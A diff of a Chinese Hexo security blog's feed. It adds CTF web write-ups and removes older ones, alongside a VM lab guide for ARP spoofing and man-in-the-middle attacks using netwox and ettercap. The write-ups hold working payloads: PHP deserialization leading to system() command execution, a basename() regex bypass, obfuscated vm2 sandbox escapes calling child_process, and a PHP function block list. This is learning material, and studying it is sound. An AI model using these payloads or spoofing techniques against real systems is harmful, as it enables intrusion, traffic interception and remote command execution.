@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-05-07T01:40:24.396Z</updated>
+  <updated>2020-06-01T13:35:00.000Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,116 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>实验环境 vmware12 + KALI2020.2</title>
+    <link href="http://yoursite.com/2020/05/30/%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%20vmware12%20+%20KALI2020.2/"/>
+    <id>http://yoursite.com/2020/05/30/%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%20vmware12%20+%20KALI2020.2/</id>
+    <published>2020-05-30T07:43:56.350Z</published>
+    <updated>2020-06-01T13:35:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="实验环境-vmware12-KALI2020-2"><a href="#实验环境-vmware12-KALI2020-2" class="headerlink" title="实验环境 vmware12 + KALI2020.2"></a>实验环境 vmware12 + KALI2020.2</h2><p>一：导入XP系统</p><p>1过程</p><ol><li><p>在 Workstation Pro 中，选择<strong>文件</strong> &gt; <strong>打开</strong>。</p></li><li><p>浏览到 .ovf 或 .ova 文件，然后单击<strong>打开</strong>。</p></li><li><p>键入虚拟机名称，再键入或浏览至虚拟机文件目录，然后单击<strong>导入</strong>。</p><p>Workstation Pro 会执行 OVF 规范一致性和虚拟硬件合规性检查。状态栏中会显示导入进度。</p></li><li><p>如果导入失败，可单击<strong>重试</strong>重新尝试操作，或者单击<strong>取消</strong>以取消导入。</p><p>如果重新尝试导入，Workstation Pro 会放宽 OVF 规范一致性与虚拟硬件合规性检查，但您可能无法使用 Workstation Pro 中的虚拟机。</p></li></ol><h2 id="二：关闭win-XP-和win10防火墙（XP的系统已经默认关闭了）"><a href="#二：关闭win-XP-和win10防火墙（XP的系统已经默认关闭了）" class="headerlink" title="二：关闭win XP 和win10防火墙（XP的系统已经默认关闭了）"></a>二：关闭win XP 和win10防火墙（XP的系统已经默认关闭了）</h2><p>同时关闭XP的防火墙。</p><p>对win10进行设置：</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529234440730.png" srcset="/img/loading.gif" alt="image-20200529234440730"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529234451763.png" srcset="/img/loading.gif" alt="image-20200529234451763"></p><h3 id="二（补充）：如果无法点击高级设置。就搜索防火墙"><a href="#二（补充）：如果无法点击高级设置。就搜索防火墙" class="headerlink" title="二（补充）：如果无法点击高级设置。就搜索防火墙"></a>二（补充）：如果无法点击高级设置。就搜索防火墙</h3><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530171703863.png" srcset="/img/loading.gif" alt="image-20200530171703863"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529234504869.png" srcset="/img/loading.gif" alt="image-20200529234504869"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529234516814.png" srcset="/img/loading.gif" alt="image-20200529234516814"></p><h2 id="三：（可跳过-用于解决VM桥接模式下无法联网的问题）修改网络为桥接模式"><a href="#三：（可跳过-用于解决VM桥接模式下无法联网的问题）修改网络为桥接模式" class="headerlink" title="三：（可跳过/用于解决VM桥接模式下无法联网的问题）修改网络为桥接模式"></a>三：（可跳过/用于解决VM桥接模式下无法联网的问题）修改网络为桥接模式</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153718746.png" srcset="/img/loading.gif" alt="image-20200530153718746"></h2><p>【按住ctrl左键点击vm8和可以联网的网卡，右键vm8点击桥接。会出现新的网卡。右键新的网络，点击“属性“，找到“IPv4”，打开其”属性“，默认为自动获取IP，改成手动设置，IP填写你局域网中的IP，比如我的可以填写为192.168.31.109（只要符合你们局域网IP范围就可以），子网掩码默认，在默认网关处填写路由器的IP，比如我的是192.168.31.1；】<strong>该步骤是解决win10桥接下无法联网的解决办法，<u>可跳过</u></strong></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530174900133.png" srcset="/img/loading.gif" alt="image-20200530174900133"></p><p>默认网关用ipconfig查看。</p><p>【在下方的DNS处，可以填写比较好用的114.114.114.114和223.5.5.5。然后确定。<br>】<em><em>这步骤同上。</em>，若虚拟机有网则不需要</em></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530175305661.png" srcset="/img/loading.gif" alt="image-20200530175305661"></p><h2 id="四：修改虚拟机网络配置"><a href="#四：修改虚拟机网络配置" class="headerlink" title="四：修改虚拟机网络配置"></a>四：修改虚拟机网络配置</h2><p>1.打开虚拟网络编辑器</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200601210737893.png" srcset="/img/loading.gif" alt="image-20200601210737893"></p><p>2.</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530180640690.png" srcset="/img/loading.gif" alt="image-20200530180640690"></p><p>这里的网卡需要设置成本机名字的网卡。比如：AC 9462</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530180917529.png" srcset="/img/loading.gif" alt="image-20200530180917529"></p><p>3.选择桥接模式</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200601210915755.png" srcset="/img/loading.gif" alt="image-20200601210915755"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530154028167.png" srcset="/img/loading.gif" alt="image-20200530154028167"></p><p>将XP和kali的设置都设置成桥接模式。如上图。</p><p><strong>要保证虚拟机之间虚拟机主机 主机虚拟机可以互ping，并且在同一网段</strong></p><p><strong>如果都能成功，则修改完成。</strong></p><h2 id="五：安装netwox"><a href="#五：安装netwox" class="headerlink" title="五：安装netwox"></a>五：安装netwox</h2><p>1.sudo vi /etc/apt/sources.list</p><p>2.在后面添加源：</p><pre><code class="text">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</code></pre><p>3.i是插入。</p><blockquote><p>sudo apt-get update</p><p>sudo apt-get install netwox</p></blockquote><h2 id="五：运行Netwox工具包，对靶机进行假冒源地址"><a href="#五：运行Netwox工具包，对靶机进行假冒源地址" class="headerlink" title="五：运行Netwox工具包，对靶机进行假冒源地址"></a>五：运行Netwox工具包，对靶机进行假冒源地址</h2><p>本机：192.168.31.21</p><p>XP：192.168.31.128</p><p>kali：192.168.31.129</p><p>1—互相ping通，记录mac地址和IP。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530132059565.png" srcset="/img/loading.gif" alt="image-20200530132059565"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530132111925.png" srcset="/img/loading.gif" alt="image-20200530132111925"></p><p>2.</p><p>记下kali xp 物理机的 IP和MAC地址。如果显示上图则表示成功。在kali上输入：<strong>每个人输入的不一样，这个终端<u>别关掉</u>它不会出现回显的</strong></p><blockquote><p>sudo netwox 80 “00:0c:29:c8:27:5d”（kali的MAC地址） -i “192.168.31.21”    （win10）//告诉靶机B，靶机C192.168.31.21的MAC地址 00:0c:29:c8:27:5d</p></blockquote><p>3.</p><p>在kali中再打开一个终端sudo wireshark</p><p>切换到XP系统，输入arp -a</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530130418592.png" srcset="/img/loading.gif" alt="image-20200530130418592"></p><p>可以看见kali正在欺骗XP（192.168.31.128）win10的mac地址为00:0c:29:c8:27:5d（而实际上这其实是kali的mac地址）</p><p><strong><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530131219459.png" srcset="/img/loading.gif" alt="image-20200530131219459"></strong></p><p>可以发现已经欺骗成功了。这个时候XP上ping 192.168.31.21发现无法成功。</p><p><strong>这样就完成了一次简单的ARP欺骗。</strong></p><h2 id="六：ettercap-实现中间人攻击"><a href="#六：ettercap-实现中间人攻击" class="headerlink" title="六：ettercap 实现中间人攻击"></a>六：ettercap 实现中间人攻击</h2><p>1.</p><blockquote><p>sudo ettercap -G(新版ettercap,旧版在下面)</p></blockquote><p>2.首先选择Sniff-&gt;ARP poioning</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530154601623.png" srcset="/img/loading.gif" alt="image-20200530154601623"></p><p>3.</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530154637446.png" srcset="/img/loading.gif" alt="image-20200530154637446"></p><p>从我们发现的主机中，选择我们的目标。从<code>Hosts</code>菜单栏中选择</p><p>3.<code>Hosts list</code>。</p><p>4.scan for hosts</p><ol><li>从列表中选择<code>192.168.31.21</code>，并点击<code>Add to Target 1</code>。</li><li>之后选择<code>192.168.31.128，之后点击</code>Add to Target 2`。</li><li>现在我们检查目标：在<code>Targets</code>菜单中，选择<code>Current targets</code>。</li></ol><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530154508637.png" srcset="/img/loading.gif" alt="image-20200530154508637"></p><p>5.然后点击左上角的箭头开始攻击。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200601184923242.png" srcset="/img/loading.gif" alt="image-20200601184923242"></p><p>可以发现mac地址已经全部修改为kali的mac地址。</p><p>6.查看wireshark，仔细观察可以看见kali一直在广播对XP和win10进行ARP欺骗。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153450571.png" srcset="/img/loading.gif" alt="image-20200530153450571"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153539587.png" srcset="/img/loading.gif" alt="image-20200530153539587"></p><h2 id="旧版"><a href="#旧版" class="headerlink" title="旧版"></a>旧版</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530203006988.png" srcset="/img/loading.gif" alt="image-20200530203006988"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530203019644.png" srcset="/img/loading.gif" alt="image-20200530203019644"></p><p>然后右上角start</p><h2 id="七：使用netwox进行中间人攻击"><a href="#七：使用netwox进行中间人攻击" class="headerlink" title="七：使用netwox进行中间人攻击"></a>七：使用netwox进行中间人攻击</h2><p>将kali的MAC地址伪装成XP，向WIN10发送ARP Reply</p><p>将kali的MAC地址伪装成win10，向XP发送ARP Reply</p><p>一：在kali上开两个窗口分别输入</p><blockquote><p>sudo netwox 80 (kali MAC地址)  -i  “XP’s IP”</p><p>sudo netwox 80 (kali MAC地址)  -i  “Win10’s IP”</p></blockquote><p>二：arp -a(XP)</p><p>查看并记录XP和WIN10的ARP表变化</p><p>三：查看、记录并分析kali、XP和WIN10上wireshark捕获的ARP报文</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153450571.png" srcset="/img/loading.gif" alt="image-20200530153450571"></p><p>可以看见kali不停的播放ARP广播实行欺骗。</p><ul><li><p>当XP发送数据给WIN10时，通过广播ARP 请求包，询问IP(win10)映射的MAC(win10)</p></li><li><p>同一网段的主机都会收到ARP请求包。win10会返回IP(WIN10)–MAC(WIN10)，攻击节点kali会返回IP(WIN10)–MAC(kali)，其他机器不做应答。</p></li><li><p>尽管win10也做出响应，但kali不断发送响应包，导致XP的ARP映射表保存了错误的映射。当xp想WIN10发送数据的时候，将会发送到kali的端口。若kali同时冒充XP和WIN10，则这就构成了中间人攻击。</p></li></ul><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153539587.png" srcset="/img/loading.gif" alt="image-20200530153539587"></p><p>而也可实现互相ping通，则可发现实验是成功的，kali成功的对win10和winXP之间的通信进行了欺骗。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;实验环境-vmware12-KALI2020-2&quot;&gt;&lt;a href=&quot;#实验环境-vmware12-KALI2020-2&quot; class=&quot;headerlink&quot; title=&quot;实验环境 vmware12 + KALI2020.2&quot;&gt;&lt;/a&gt;实验环境 vmware1
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>[网鼎杯 2020 朱雀组]phpweb</title>
+    <link href="http://yoursite.com/2020/05/20/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]phpweb/"/>
+    <id>http://yoursite.com/2020/05/20/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]phpweb/</id>
+    <published>2020-05-20T10:18:49.067Z</published>
+    <updated>2020-05-20T10:18:49.067Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>fuzz一下发现报错信息中有call_user_func()。但是我太菜了绕不过。用payload：</p><blockquote><p>func=file_get_contents&amp;p=index.php</p></blockquote><p>看一下源码</p><pre><code class="php">&lt;?php    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);    function gettime($func, $p) {        $result = call_user_func($func, $p);        $a= gettype($result);        if ($a == &quot;string&quot;) {            return $result;        } else {return &quot;&quot;;}    }    class Test {        var $p = &quot;Y-m-d h:i:s a&quot;;        var $func = &quot;date&quot;;        function __destruct() {            if ($this-&gt;func != &quot;&quot;) {                echo gettime($this-&gt;func, $this-&gt;p);            }        }    }    $func = $_REQUEST[&quot;func&quot;];    $p = $_REQUEST[&quot;p&quot;];    if ($func != null) {        $func = strtolower($func);        if (!in_array($func,$disable_fun)) {            echo gettime($func, $p);        }else {            die(&quot;Hacker...&quot;);        }    }    ?&gt;</code></pre><p>反序列化Test,利用call_user_func函数进行绕过，文件名匹配可以用反序列化绕过</p><pre><code>反序列化Test,利用call_user_func函数进行绕过，文件名匹配可以用反序列化绕过</code></pre><p><code>&lt;?php</code><br><code>class Test {</code><br>    <code>var $p = &quot;Y-m-d h:i:s a&quot;;</code><br>    <code>var $func = &quot;date&quot;;</code><br>    <code>function __destruct() {</code><br>        <code>if ($this-&gt;func != &quot;&quot;) {</code><br>            <code>echo gettime($this-&gt;func, $this-&gt;p);</code><br>        <code>}</code><br>    <code>}</code><br><code>}</code></p><p><code>$a = new Test();</code><br><code>$a -&gt; p=&quot;ls ../../../../../&quot;;</code><br><code>$a -&gt; func = &quot;system&quot;;</code><br><code>print_r(urlencode(serialize($a)));</code><br><img src="https://img-blog.csdnimg.cn/20200518171039755.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NoZW5aSUR1,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><p><code>$a = new Test();</code></p><p> <code>$a -&gt; p=&quot;cat /tmp/flagoefiu4r93&quot;;</code></p><p> <code>$a -&gt; func = &quot;system&quot;; print_r(urlencode(serialize($a)));</code></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;网鼎杯-2020-朱雀组-phpweb&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-朱雀组-phpweb&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2020 朱雀组]phpweb&quot;&gt;&lt;/a&gt;[网鼎杯 2020 朱雀组]phpweb&lt;/h2&gt;&lt;p&gt;
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>[Zer0pts2020]Can you guess it</title>
+    <link href="http://yoursite.com/2020/05/19/[Zer0pts2020]Can%20you%20guess%20it/"/>
+    <id>http://yoursite.com/2020/05/19/[Zer0pts2020]Can%20you%20guess%20it/</id>
+    <published>2020-05-19T04:34:31.612Z</published>
+    <updated>2020-05-19T04:34:31.612Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><p>可以看到有一个随机数，如果能够破解随机数就能得到flag，在这里卡了半天也没做出来：</p><?phpinclude 'config.php'; // FLAG is defined in config.phpif (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {  exit("I don't know what you are thinking, but I won't let you read it :)");}if (isset($_GET['source'])) {  highlight_file(basename($_SERVER['PHP_SELF']));  exit();}$secret = bin2hex(random_bytes(64));if (isset($_POST['guess'])) {  $guess = (string) $_POST['guess'];  if (hash_equals($secret, $guess)) {    $message = 'Congratulations! The flag is: ' . FLAG;  } else {    $message = 'Wrong.';  }}?><!doctype html><html lang="en">  <head>    <meta charset="utf-8">    <title>Can you guess it?</title>  <meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml"></head>  <body>    <h1>Can you guess it?</h1>    <p>If your guess is correct, I'll give you the flag.</p>    <p><a href="?source">Source</a></p>    <hr><?php if (isset($message)) { ?>    <p><?= $message ?></p><?php } ?>    <form action="index.php" method="POST">      <input type="text" name="guess">      <input type="submit">    </form>  </body></html><p>当我访问index.php时，我可以在后面加上一些东西，比如/index.php/config.php，这样仍然访问的是index.php，但经过basename()后，传进highlight_file()函数的文件名就变成了config.php，如果能绕过那个正则，就可以得到config.php源码了，而题目告诉FLAG就在config.php里，这道题就做完了。所以说，那个随机数就是个障眼法<br>可以发现发现，这个正则匹配了config.php/为$_SERVER[‘PHP_SELF’]的结尾</p><pre><code>/config\.php\/*$/i1</code></pre><p>老套路了，可以用%0d之类的来污染绕过，这样仍然访问得到index.php:</p><pre><code>/index.php/config.php/%0d</code></pre><p>$_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php?source来读取flag。</p><p>但是正则过滤了/config.php/*$/i。<br>从 <a href="https://bugs.php.net/bug.php?id=62119" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=62119</a> 找到了basename()函数的一个问题，它会去掉文件名开头的非ASCII值：</p><blockquote><p>var_dump(basename(“xffconfig.php”)); // =&gt; config.php<br>var_dump(basename(“config.php/xff”)); // =&gt; config.php</p><p>所以这样就能绕过正则了，payload：</p></blockquote><blockquote><p>/index.php/config.php/%ff?source</p></blockquote>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;Zer0pts2020-Can-you-guess-it&quot;&gt;&lt;a href=&quot;#Zer0pts2020-Can-you-guess-it&quot; class=&quot;headerlink&quot; title=&quot;[Zer0pts2020]Can you guess it?&quot;&gt;&lt;/a&gt;
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>[HFCTF2020]JustEscape</title>
+    <link href="http://yoursite.com/2020/05/17/[HFCTF2020]JustEscape/"/>
+    <id>http://yoursite.com/2020/05/17/[HFCTF2020]JustEscape/</id>
+    <published>2020-05-17T02:59:35.162Z</published>
+    <updated>2020-05-17T02:59:35.162Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p>最近老遇到js的题目，表示完全不会。</p><p>看网上的wp，是基于node.js的网站，如输入Error().stack 即可报错（同时发现VM沙箱机制）。</p><p>这是网上的payload：</p><pre><code class="javascript">&quot;use strict&quot;;const {VM} = require(&#39;vm2&#39;);const untrusted = &#39;(&#39; + function(){    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();    try{        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;    }catch(e){        return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    }}+&#39;)()&#39;;try{    console.log(new VM().run(untrusted));}catch(x){    console.log(x);}</code></pre><p>但是反引号和${}已经被过滤掉了，</p><pre><code class="javascript">(function (){    TypeError[`${`${`prototyp`}e`}`][`${`${`get_pro`}cess`}`] = f=&gt;f[`${`${`constructo`}r`}`](`${`${`return proc`}ess`}`)();    try{        Object.preventExtensions(Buffer.from(``)).a = 1;    }catch(e){        return e[`${`${`get_pro`}cess`}`](()=&gt;{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();    }})()</code></pre><p>第二种绕过是：使用join来拼接字符串</p><pre><code class="javascript">(()=&gt;{ TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try{ Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; }catch(e){ return e[`a`](()=&gt;{})[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat /flag`)[`toString`](); } })()</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;HFCTF2020-JustEscape&quot;&gt;&lt;a href=&quot;#HFCTF2020-JustEscape&quot; class=&quot;headerlink&quot; title=&quot;[HFCTF2020]JustEscape&quot;&gt;&lt;/a&gt;[HFCTF2020]JustEscape&lt;/h2
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>[XNUCA2019Qualifier]EasyPHP</title>
+    <link href="http://yoursite.com/2020/05/13/[XNUCA2019Qualifier]EasyPHP/"/>
+    <id>http://yoursite.com/2020/05/13/[XNUCA2019Qualifier]EasyPHP/</id>
+    <published>2020-05-13T09:24:38.721Z</published>
+    <updated>2020-05-13T09:24:38.722Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h2><ul><li>解法一<ul><li>[1、error_log结合log_errors自定义错误日志]</li><li>[2、include_path设置包含路径]</li><li>[3、php_value zend.multibyte 1结合php_value zend.script_encoding “UTF-7”绕过尖括号&lt;过滤]</li><li>[4、# \ 绕过.htaccess中多余字符]</li></ul></li><li>解法二<ul><li>[5、.htaccess配置prce绕过正则匹配]</li></ul></li><li>[解法三]</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;XNUCA2019Qualifier-EasyPHP&quot;&gt;&lt;a href=&quot;#XNUCA2019Qualifier-EasyPHP&quot; class=&quot;headerlink&quot; title=&quot;[XNUCA2019Qualifier]EasyPHP&quot;&gt;&lt;/a&gt;[XNUCA2
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</title>
@@ -343,124 +453,6 @@
       
       
         &lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/chrysanthemum/p/11757363.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.cnblogs.com/chrysanthemum/p/11
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>easy_tornado</title>
-    <link href="http://yoursite.com/2020/03/15/easy-tornado/"/>
-    <id>http://yoursite.com/2020/03/15/easy-tornado/</id>
-    <published>2020-03-15T03:35:06.000Z</published>
-    <updated>2020-03-15T03:52:04.843Z</updated>
-    
-    <content type="html"><![CDATA[<p>welcome.txt的页面提示render，就想到了模板注入，flag.txt中告诉了flag文件的位置，hint.txt提示md5(cookie_secret+md5(filename))。</p><p>就是说要通过模板注入找到cookie_secret,然后编写python脚本将flag_name进行md5加密，<br>最后总体加密。同时观察hint.txt的url发现</p><pre><code>file?filename=/hints.txt&amp;filehash=c4d9e17f8cdc1e065a1af55625ffca16</code></pre><p> 那么最终就是：</p><blockquote><blockquote><p>file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))</p></blockquote></blockquote><p> python脚本：</p><pre><code> import hashlibdef hash(value):    md5 = hashlib.md5(value)    md5.update(value)    result = md5.hexdigest()    return resultdef jiami():    filename = &#39;/fllllllllllllag&#39;    cookie_S = &#39;de639f1e-0c39-46e5-b8cb-1cd29f56aea3&#39;    print(hash(filename.encode(&#39;utf-8&#39;)))    x = hash(filename.encode(&#39;utf-8&#39;))    y = cookie_S +x    print(hash(y.encode(&#39;utf-8&#39;)))jiami()</code></pre><p>参考链接：<a href="https://blog.csdn.net/cccccfive/article/details/83145669" target="_blank" rel="noopener">https://blog.csdn.net/cccccfive/article/details/83145669</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;welcome.txt的页面提示render，就想到了模板注入，flag.txt中告诉了flag文件的位置，hint.txt提示md5(cookie_secret+md5(filename))。&lt;/p&gt;
-&lt;p&gt;就是说要通过模板注入找到cookie_secret,然后编写py
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>关于php的session.serialize_handler的问题</title>
-    <link href="http://yoursite.com/2020/03/10/%E5%85%B3%E4%BA%8Ephp%E7%9A%84session-serialize-handler%E7%9A%84%E9%97%AE%E9%A2%98/"/>
-    <id>http://yoursite.com/2020/03/10/%E5%85%B3%E4%BA%8Ephp%E7%9A%84session-serialize-handler%E7%9A%84%E9%97%AE%E9%A2%98/</id>
-    <published>2020-03-10T03:50:59.000Z</published>
-    <updated>2020-03-10T03:51:00.890Z</updated>
-    
-    <content type="html"><![CDATA[<p>前言<br>php的session信息是储存在文件中的</p><p>session.save_path=”” 指定储存的路径<br>session.save_handler=”” 指定储存时使用的函数（默认是file）<br>session.auto_start boolen<br>session.serialize_handler=”” 定义序列化和反序列化的处理器的名字，默认是php(5.5.4后改为php_serialize)<br>session.serialize_handler存在以下几种</p><p>php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值<br>php 键名+竖线（|）+经过serialize()函数处理过的值<br>php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化<br>使用过程中如果想要修改，使用</p><p>ini_set(‘session.serialize_handler’,’php_serialize’);<br>但这里设置的handler如果和默认的不同，就会出问题</p><p>比如默认是php的handler，在该页面设置为php_serialize</p><p>这是如果我们传入一个 ‘|O:5:”Class”‘;,这样的一个数据，在储存时就会加上键名进行序列化，但是进行读取的时候还是会按照php handler来处理，以|作为键和值的分隔符，将前半部分当作键，后半部分当作值,然后进行反序列化</p><p>CTF<br>jarvisoj PHPINFO</p><p>引用官方文档的内容</p><p>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</p><p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 通常这些键值可以通过读取INI设置来获得</p><p>通俗的说就是请求时加上与session.upload_progress.name同名的变量时就会在$_SESSION中加上一组新的数据</p><p>来看这道题，题目给了源码</p><?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO{    public 